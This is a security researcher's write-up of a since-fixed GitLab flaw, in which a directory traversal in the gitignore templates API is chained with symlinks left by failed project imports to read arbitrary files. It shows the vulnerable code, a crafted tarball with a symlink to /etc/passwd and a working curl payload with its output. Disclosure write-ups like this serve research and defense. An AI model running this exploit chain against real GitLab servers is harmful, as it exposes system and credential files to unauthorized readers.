---
title:  "Chaining multiple low-impact bugs to arbitrary file read in GitLab"
categories: security
---

Since around August 2019, I began to read the source code of GitLab and test it
over and over. The time pays me back, during the first several months I found
some critical bugs (mentioned in my previous posts). Unsurprisingly, it became
harder and harder to find new high-impact and easily exploitable bugs as the
application was growing with the hunters to be more and more robust.

## Exploit the unexploitable

### Unexplotable directory traversal
In one of my posts, I described that I was using some static analysis techniques
based on Rubocop to find potential exploitable function calls in the source
code. The tool is very trivial and false alarms are inevitable, so I just
ignored those I thought were unexploitable every time I check the output of my
Rubocop. One of them are like this:

``` ruby
module Gitlab
  module Template
    module Finders
...
        def read(path)
          File.read(path)
        end
...
```
This interesting method is calling `File#read` which is a potential command
execution vulnerability if the argument is controllable. (Mentioned in
[this post](/security/CVE-2018-18649-Gitlab-RCE/)). Or even if it's not
fully controllable, the function could still be used to read local files.

So how much can we control the argument? The call stack goes up to the templates
API:

``` ruby
      get "templates/#{template_type}/:name" do
        finder = TemplateFinder.build(template_type, nil, name: declared(params)[:name])
        new_template = finder.execute

        render_response(template_type, new_template)
      end
```

Where `params[:name]` is controllable, then it's passed to `GitignoreTemplate`
then to `GlobalTemplateFinder` finally. I'm not going to paste too much code
snippets here, anyone who is interested in the implementation can visit
[the repository](https://gitlab.com/gitlab-org/gitlab-ce/tree/v11.5.2) for
details.

Finally I figured out that the logic of the `TemplateFinder` is:
1. Concatenate user-inputted `name` with an extension (`.gitignore`) and prefix
them with a category name (`Global`)
2. Find the constructed path in `Rails.root`
3. If `File.exist?(path)`, then call `File.read(path)` and returns the content
through the API

For example:

``` shell
$ curl https://gitlab.com/api/v4/templates/gitignores/SVN
{"name":"SVN","content":".svn/\n"}

$ cat gitlab-ce/vendor/gitignore/Global/SVN.gitignore
.svn/
```

Is there a directory traversal here? Yes.
GitLab ships some gitignore templates outside the Global directory

``` shell
$ curl https://gitlab.com/api/v4/templates/gitignores/%2e%2e%2fScala%2ea
{"name":"Scala","content":"*.class\n*.log\n"}

$ cat gitlab-ce/vendor/gitignore/Scala.gitignore
*.class
*.log
```

Note: the last 2 characters `%2e a` (`.a`) is used to feed the `format`
part of the request in Rails applications. Otherwise `./Scala` would be
treated as the request format.

Finally, we have a crippled directory traversal issue which has several
limits, making it a worthless bug. It's hard to believe that there is any
confidential information in a GitLab instance being stored in some `.gitignore`
files. A simple `find` command proved my assumption, this is an unexploitable
bug.

### Exploit it
But wait, although GitLab doesn't ship any fruitful `blah.gitignore` files
itself, we might could ask the application to create some on the fly. Symbolic
links are always good friends, if we can create a symbolic link in the
file-system and point it to a confidential file, then the directory traversal
becomes exploitable.

The second issue is in project import, I had known it for some time since I was
testing CVE-2018-14364. But I even didn't recognize it as a "bug" due to its
low impact (none impact to be accurate). That when someone tries to import a
tarball which contains any protected (not writable) symbolic links, the import
fails and leaves the temporary directory not purged. The directory has a
`SecureRandom` part in its path so it would not be used again like I did in
[CVE-2018-14364](https://blog.nyangawa.me/security/CVE-2018-14364-Gitlab-RCE/).

Example:

``` shell
$ tar tvf project.tar.gz

-rw-r--r-- asakawa/asakawa 431 2018-12-04 13:16 project.bundle
-rw-r--r-- asakawa/asakawa 1799 2018-12-04 19:10 project.json
dr-xr-xr-x asakawa/asakawa    0 2018-12-04 13:22 uploads/
lrwxrwxrwx asakawa/asakawa    0 2018-12-04 13:22 uploads/link.gitignore -> /etc/passwd
-rw-r--r-- asakawa/asakawa    5 2018-12-04 13:16 VERSION
```

After the import fails, the `link.gitignore` is left alone in the file-system at
somewhere like.

``` shell
/var/opt/gitlab/gitlab-rails/shared/tmp/project_exports/root/interesting-36f24022b707434f2f060c4a3559216f/8cef47205d875e9e9528a844ce20e092/uploads/link.gitignore -> /etc/passwd
```

The information is leaked in the import error page by GitLab itself, actually I
think there's nothing to blame here. Giving as much as potentially useful
information to the user can save a lot of time from blindly debugging.

So, by combining the 2 unexplotable bugs, I get a convincing exploit:

``` shell
$ URL="http://10.26.0.3"
$ PAYLOAD=$(echo "../../../public/uploads/../shared/tmp/project_exports/root/interesting-36f24022b707434f2f060c4a3559216f/8cef47205d875e9e9528a844ce20e092/uploads/link" | sed 's|\.|%2e|g' | sed 's|\/|%2f|g')
$ curl $URL/api/v4/templates/gitignores/$PAYLOAD%2ea

{"name":"link","content":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n
...
```

### Response from GitLab
GitLab has a decent security team, they took the issue seriously and continually
provided updates about the issue and the fix.

They have disclosed [the issue](https://gitlab.com/gitlab-org/gitlab-ce/issues/54857)
in their issue tracker after one month from the fix. I totally believe the value
of transparency and
[GitLab's handbook](https://about.gitlab.com/handbook/values/#transparency)
has a very clear description on transparency. I think it makes sense for
the collaboration between the community of security researchers and the
applications. OSS(open source softwares) give full transparency of their source
code to the community so that the researchers could do much better on improving
the quality of the applications than spending too much time to reconnoitering a
black box and leaving those potentially critical deeply hidden security flaws
undiscovered.
